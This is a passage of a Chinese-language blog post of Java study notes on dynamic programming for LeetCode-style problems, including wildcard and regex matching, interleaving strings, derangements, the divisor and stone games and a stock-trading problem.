class="number">0</span>][<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//类似p="**a" s="a"条件下        </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pArr[i - <span class="number">1</span>] != <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(pArr[i-<span class="number">1</span>]==sArr[j-<span class="number">1</span>]||pArr[i-<span class="number">1</span>]==<span class="string">'?'</span>) dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(pArr[i-<span class="number">1</span>]==<span class="string">'*'</span>) dp[i][j] = dp[i-<span class="number">1</span>][j]||dp[i][j-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>降维打击！</p><p>S=” acdcb”</p><p>P= “a*c?b”</p><table><thead><tr><th></th><th><strong>Null</strong></th><th><strong>A</strong></th><th><strong>C</strong></th><th><strong>D</strong></th><th><strong>C</strong></th><th><strong>B</strong></th></tr></thead><tbody><tr><td><strong>Null</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td><strong>A</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td>*****</td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td></tr><tr><td><strong>C</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td></tr><tr><td><strong>?</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>T</strong></td></tr><tr><td><strong>B</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr></tbody></table><table><thead><tr><th></th><th><strong>Null</strong></th><th><strong>A</strong></th><th><strong>C</strong></th><th><strong>D</strong></th><th><strong>C</strong></th><th><strong>B</strong></th></tr></thead><tbody><tr><td><strong>Null</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td><strong>A</strong></td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td><td><strong>F</strong></td></tr><tr><td>*****</td><td><strong>F</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td><td><strong>T</strong></td></tr><tr><td><strong>C</strong></td><td><strong>F</strong></td><td><strong>Position1</strong></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>?</strong></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>B</strong></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>由于上面都是FTTTTT而position1的时候应该是false，由于二维数组默认初始化是false，一维数组是继承上一次的值，因此判断条件得改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch1</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] sArr = s.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] pArr = p.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> n=pArr.length,m=sArr.length;</span><br><span class="line">    <span class="keyword">boolean</span>[] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[m + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span> tmp,pre=<span class="keyword">true</span>;              </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=n; i++) &#123;</span><br><span class="line">        pre=dp[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=dp[<span class="number">0</span>]&amp;&amp; pArr[i-<span class="number">1</span>]==<span class="string">'*'</span>; <span class="comment">//类似p="**a" s="a"条件下 </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            tmp=dp[j];</span><br><span class="line">            <span class="keyword">if</span>(pArr[i-<span class="number">1</span>]!=<span class="string">'*'</span>) dp[j]=pre&amp;&amp;(pArr[i-<span class="number">1</span>]==sArr[j-<span class="number">1</span>]||pArr[i-<span class="number">1</span>]==<span class="string">'?'</span>);</span><br><span class="line">            <span class="keyword">else</span> dp[j] = dp[j]||dp[j-<span class="number">1</span>];</span><br><span class="line">            pre=tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>难度挺大的，我也不能自己改出来。</p><h2><span id="10-regular-expression-matching">10. Regular Expression Matching ×</span></h2><p>Given an input string (s) and a pattern (p), implement regular expression matching with support for ‘.’ and ‘*’.</p><p>‘.’ Matches any single character.</p><p>‘*’ Matches zero or more of the preceding element.</p><p>The matching should cover the <strong>entire</strong> input string (not partial).</p><p><strong>Note:</strong></p><ul><li>s could be empty and     contains only lowercase letters a-z.</li><li>p could be empty and     contains only lowercase letters a-z, and characters     like . or *.</li></ul><p><strong>Example 1:</strong></p><p><strong>Input:</strong></p><p>s = “aa”</p><p>p = “a”</p><p><strong>Output:</strong> false</p><p><strong>Explanation:</strong> “a” does not match the entire string “aa”.</p><p><strong>Example 2:</strong></p><p><strong>Input:</strong></p><p>s = “aa”</p><p>p = “a*”</p><p><strong>Output:</strong> true</p><p><strong>Explanation:</strong> ‘*’ means zero or more of the preceding element, ‘a’. Therefore, by repeating ‘a’ once, it becomes “aa”.</p><p><strong>Example 3:</strong></p><p><strong>Input:</strong></p><p>s = “ab”</p><p>p = “.*”</p><p><strong>Output:</strong> true</p><p><strong>Explanation:</strong> “.*” means “zero or more (*) of any character (.)”.</p><p><strong>Example 4:</strong></p><p><strong>Input:</strong></p><p>s = “aab”</p><p>p = “c<em>a</em>b”</p><p><strong>Output:</strong> true</p><p><strong>Explanation:</strong> c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches “aab”.</p><p><strong>Example 5:</strong></p><p><strong>Input:</strong></p><p>s = “mississippi”</p><p>p = “mis<em>is*p</em>.”</p><p><strong>Output:</strong> false</p><p>和上一道题有点像但是有点不同，还是先画图。</p><p><img src="clip_image001-1585282035109.png" alt></p><p><strong>遇到初始化问题我们也可以画图，然后我们需要</strong></p><p>c*可以看做是null</p><p>因此c<em>==null初始化为true同理c</em>a*也是true</p><p>l 匹配空串aa*和aa</p><p>dp[i][j]=dp[i-1][j];</p><p>l 匹配0个前一个字符，bc* b</p><p> dp[i][j]=dp[i-2][j]</p><p>l 然后它还有一个功能就是匹配n个前个字符a*和aaaaaa</p><p>那么我们就需要判断a<em>的第一个a和aaaa的后面几个a一不一样，否则会出现a</em>匹配abbb等等情况，或者说.*可以匹配abccdd等等情况。</p><p><strong>1.</strong>   <strong>ba*</strong>和b这种情况下，b和a不相等，那么*只有消除a的情况下才可能匹配**</p><p><strong>2.</strong>   <strong>如果是p[]相等的情况下。</strong></p><p><strong>如果是a*和aaaa这种情况下，此时*下标为i只有a[i-1]和a[j]相等的情况下，*代表n个a才是有意义的。</strong>dp[i][j-1]</p><p><strong>“aaa”</strong>和”ab*a*c*a”情况下，b*和c*为空且a*只能代表一个a，</p><p><em>B*</em>为空就是等于dp[i][j]=dp[i-2][j];</p><p><em>a*</em>代表一个a就等于dp[i][j]=dp[i-1][j]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] s1 = s.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] p1 = p.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> n=s1.length,m=p1.length;</span><br><span class="line">    <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) </span><br><span class="line">        <span class="keyword">if</span>(p1[i-<span class="number">1</span>]==<span class="string">'*'</span>&amp;&amp;dp[i-<span class="number">2</span>][<span class="number">0</span>]) dp[i][<span class="number">0</span>]=<span class="keyword">true</span>;        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1[i-<span class="number">1</span>]==<span class="string">'.'</span>||s1[j-<span class="number">1</span>]==p1[i-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(p1[i-<span class="number">1</span>]==<span class="string">'*'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p1[i-<span class="number">2</span>]==s1[j-<span class="number">1</span>]||p1[i-<span class="number">2</span>]==<span class="string">'.'</span>)&#123;</span><br><span class="line">                    dp[i][j]=dp[i][j-<span class="number">1</span>]||dp[i-<span class="number">1</span>][j]||dp[i-<span class="number">2</span>][j];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">2</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="97-interleaving-string">97. Interleaving String ×</span></h2><p>给定三个字符串 <em>s1</em>, <em>s2</em>, <em>s3</em>, 验证 <em>s3</em> 是否是由 <em>s1</em> 和 <em>s2</em> 交错组成的。</p><p><strong>示例</strong> <strong>1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: s1 &#x3D; &quot;aabcc&quot;, s2 &#x3D; &quot;dbbca&quot;, s3 &#x3D; &quot;aadbbcbcac&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure><p><strong>示例</strong> <strong>2:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">输入: s1 = <span class="string">"aabcc"</span>, s2 = <span class="string">"dbbca"</span>, s3 = <span class="string">"aadbbbaccc"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInterleave</span><span class="params">(String s1, String s2, String s3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>, k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>[] c1=s1.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] c2=s2.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] c3=s3.toCharArray();</span><br><span class="line">    <span class="keyword">while</span>(k&lt;c3.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;c1.length&amp;&amp;c3[k]==c1[i])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j&lt;c2.length&amp;&amp;c3[k]==c2[j])&#123;</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="orange"><strong>用三个指针并不行，因为如果s3=cac ，s1=c，s2=ca就不行了。所以还是dp解，如果s1和s2没有共同的字符那么就可以过了</strong></font></p><p>题目的输入是三个字符串，问其中两个字符串是否能够交错合并组成第三个字符串，<font color="orange"><strong>一个字符相对于其他字符的顺序在合并之后不能改变</strong></font>，这也是这道题的难点，不然的话你用一个哈希表就可以做了，三个字符串是否意味着要开三维的状态数组？还是四个步骤来看看：</p><p>·  问题拆解</p><p>在拆解问题之前，我们必须保证前两个字符串的字符的总数量必须正好等于第三个字符串的字符总数量，不然的话，再怎么合并也无法完全等同。这里有一个点，当我们考虑 str1(0…i) 和 str2(0…j) 的时候，其实第三个字串需要考虑的范围也就确定了，就是 str3(0…i+j)。如果我们要求解问题 str1(0…m) 和 str2(0…n) 是否能够交错组成 str3(0…m+n)，还是之前那句话，<font color="orange"><strong>字符串匹配问题的核心永远是字符之间的比较</strong>：</font></p><p>·  如果 str1(m) == str3(m+n)，问题拆解成考虑子问题 str1(0…m-1) 和 str2(0…n) 是否能够交错组成 str3(0…m+n-1)</p><p>·  如果 str2(n) == str3(m+n)，问题拆解成考虑子问题 str1(0…m) 和 str2(0…n-1) 是否能够交错组成 str3(0…m+n-1)</p><p>你可能会问需不需要考虑子问题 str1(0…m-1) 和 str2(0…n-1)？</p><p>在这道题目当中，<strong>不需要</strong>！</p><p>千万不要题目做多了就固定思维了，之前说到这类问题可以试着考虑三个相邻子问题是为了让你有个思路，能更好地切题，并不是说所有的字符串匹配问题都需要考虑这三个子问题，我们需要遇到具体问题具体分析。</p><p>·  状态定义</p><p>dp[i][j] 表示的是 str1(0…i) 和 str2(0…j) 是否可以交错组成 str3(0…i+j)，这里再补充说明下为什么我们不需要开多一维状态来表示 str3，其实很简单，str3 的状态是由 str1 str2 决定的，str1 str2 定了，str3 就定了</p><p>·  递推方程</p><p>把之前问题拆解中的文字描述转换成状态的表达式就是递推方程：</p><p>str1(i) == str3(i+j)<br> dp[i][j] |= dp[i - 1][j]</p><p> str2(j) == str3(i+j)<br> dp[i][j] |= dp[i][j - 1]</p><p>·  实现</p><p>初始化的时候需要考虑单个字符串能否组成 str3 对应的区间，这个比较简单，直接判断前缀是否相等即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInterleave</span><span class="params">(String s1, String s2, String s3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length1 = s1.length();</span><br><span class="line">    <span class="keyword">int</span> length2 = s2.length();</span><br><span class="line">    <span class="keyword">int</span> length3 = s3.length();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (length1 + length2 != length3) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>[] sArr1 = s1.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] sArr2 = s2.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] sArr3 = s3.toCharArray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length1; ++i) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] &amp;&amp; sArr1[i - <span class="number">1</span>] == sArr3[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length2; ++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][i - <span class="number">1</span>] &amp;&amp; sArr2[i - <span class="number">1</span>] == sArr3[i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length1; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= length2; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sArr3[i + j - <span class="number">1</span>] == sArr1[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] |= dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (sArr3[i + j - <span class="number">1</span>] == sArr2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] |= dp[i][j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[length1][length2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是能降维打击的（降维打击的难点在于初始化以及temporary memo），能做出来就行了其实，但是面试可能问怎么优化。</p><p>如果还是没有思路，那就画画表格吧，考虑当前格子的时候，看看其 <font color="orange"><strong>左边</strong>，<strong>上边</strong>，<strong>左上边</strong> </font>这三个格子所代表的子问题的状态，有实际数据作为辅助，问题之间的递进关系相对来说会比较好找些。</p><h1><span id="概率dp问题">概率DP问题</span></h1><h2><span id="4-信件错排">4. 信件错排 ×</span></h2><p>题目描述：有 N 个 信 和 信封，它们被打乱，求错误装信方式的数量。</p><p>定义一个数组 dp 存储错误方式数量，dp[i] 表示前 i 个信和信封的错误方式数量。假设第 i 个信装到第 j 个信封里面，而第 j 个信装到第 k 个信封里面。根据 i 和 k 是否相等，有两种情况：</p><ul><li>i==k，交换 i 和 j 的信后，它们的信和信封在正确的位置，但是其余 i-2 封信有 dp[i-2] 种错误装信的方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-2] 种错误装信方式。</li><li>i != k，交换 i 和 j 的信后，第 i 个信和信封在正确的位置，其余 i-1 封信有 dp[i-1] 种错误装信方式。由于 j 有 i-1 种取值，因此共有 (i-1)*dp[i-1] 种错误装信方式。</li></ul><p>综上所述，错误装信数量方式数量为：</p><p>​                              <img src="image-20200327142057967.png" alt> </p><h2><span id="5-母牛生产">5. 母牛生产 √</span></h2><p>题目描述：假设农场中成熟的母牛每年都会生 1 头小母牛，并且永远不会死。第一年有 1 只小母牛，从第二年开始，母牛开始生小母牛。每只小母牛 3 年之后成熟又可以生小母牛。给定整数 N，求 N 年后牛的数量。</p><p>第 i 年成熟的牛的数量为：                               </p><p><img src="image-20200327144441491.png" alt></p><h1><span id="各种game集合">各种Game集合</span></h1><h2><span id="1025-divisor-game">1025. Divisor Game ×</span></h2><p>Alice and Bob take turns playing a game, with Alice starting first.</p><p>Initially, there is a number <code>N</code> on the chalkboard. On each player’s turn, that player makes a <em>move</em> consisting of:</p><ul><li>Choosing any <code>x</code> with <code>0 &lt; x &lt; N</code> and <code>N % x == 0</code>.</li><li>Replacing the number <code>N</code> on the chalkboard with <code>N - x</code>.</li></ul><p>Also, if a player cannot make a move, they lose the game.</p><p>Return <code>True</code> if and only if Alice wins the game, assuming both players play optimally.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Alice chooses 1, and Bob has no more moves.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: false</span><br><span class="line">Explanation: Alice chooses 1, Bob chooses 1, and Alice has no more moves.</span><br></pre></td></tr></table></figure><p>Game类问题都有一个特性，就是无论A还是B玩，都是在同样一个规则下做游戏，A或者B都不会对结果改变。</p><p> 其实就是DP问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">divisorGame</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> dp[] = <span class="keyword">new</span> <span class="keyword">boolean</span>[N+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i&lt;= N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%j==<span class="number">0</span>&amp;&amp;dp[i-j]==<span class="keyword">false</span>)</span><br><span class="line">                dp[i]=<span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数学证明法:</p><p>Prove it by two steps:</p><ol><li>if Alice will lose for N, then Alice will must win for N+1,     since Alice can first just make N decrease 1.</li><li>for any odd number N, it only has odd factor, so after the     first move, it will be an even number</li></ol><p>let’s check the inference<br> fisrt N = 1, Alice lose. then Alice will must win for 2.<br> if N = 3, since all even number(2) smaller than 3 will leads Alice win, so Alice will lose for 3<br> 3 lose -&gt; 4 win<br> all even number(2,4) smaller than 5 will leads Alice win, so Alice will lose for 5<br> …</p><p>Therefore, Alice will always win for even number, lose for odd number.</p><h2><span id="877-stone-game">877. Stone Game</span></h2><p>Alex and Lee play a game with piles of stones. There are an even number of piles <strong>arranged in a row</strong>, and each pile has a positive integer number of stones <code>piles[i]</code>.</p><p>The objective of the game is to end with the most stones. The total number of stones is odd, so there are no ties.</p><p>Alex and Lee take turns, with Alex starting first. Each turn, a player takes the entire pile of stones from either the beginning or the end of the row. This continues until there are no more piles left, at which point the person with the most stones wins.</p><p>Assuming Alex and Lee play optimally, return <code>True</code> if and only if Alex wins the game.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [5,3,4,5]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: </span><br><span class="line">Alex starts first, and can only take the first 5 or the last 5.</span><br><span class="line">Say he takes the first 5, so that the row becomes [3, 4, 5].</span><br><span class="line">If Lee takes 3, then the board is [4, 5], and Alex takes 5 to win with 10 points.</span><br><span class="line">If Lee takes the last 5, then the board is [3, 4], and Alex takes 4 to win with 9 points.</span><br><span class="line">This demonstrated that taking the first 5 was a winning move for Alex, so we return true.</span><br></pre></td></tr></table></figure><h1><span id="股票问题状态机">股票问题（状态机）</span></h1><p>先讲一下状态机：</p><p><img src="clip_image001.jpg" alt></p><p>类似于这样的图就叫做状态机，状态只能为状态0，状态1和状态2.</p><p>而且它们之间是可以互相转换的，且有一定的条件发生转换。</p><p>例如图一：</p><p>状态0可以保持状态0，也可以通过消抖进入状态1.</p><p>状态1可以通过确认变为状态2或者通过干扰变成状态0.</p><p>之前也学过状态机。这只是个例子，让你可以对状态机有一个大体的理解，实际上根据不同的问题，我们可以画出不同的状态机。 </p><p>状态机可以很简单的解决一系列的hard问题。</p><p>可以先看看我写的《最大子序列》</p><p>然后我们可以用一种独特的方法再来看待这道题。</p><p>看股票问题前先看完背包问题。</p><h2><span id="leetcode-121-best-time-to-buy-and-sell-stock">Leetcode 121 Best Time to Buy and Sell Stock √</span></h2><p> 给定一个数组prices，prices[i]表示股票在第i天的价格（买入or卖出），在卖出股票之前必须先买进，且手中不能同时买进两份股票，现在允许做<strong>恰好一次交易</strong>，求最大收益。</p><p>样例：</p><p>输入：[7, 1, 5, 3, 6, 4]</p><p>输出：5</p><p>输入：[7, 6, 4, 3, 1]</p><p>输出：0</p><p>正常解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">int</span> min = prices[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">     min = prices[i]&lt;min?prices[i]:min;</span><br><span class="line">     res = Math.*max*(prices[i]-min,res);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line"> 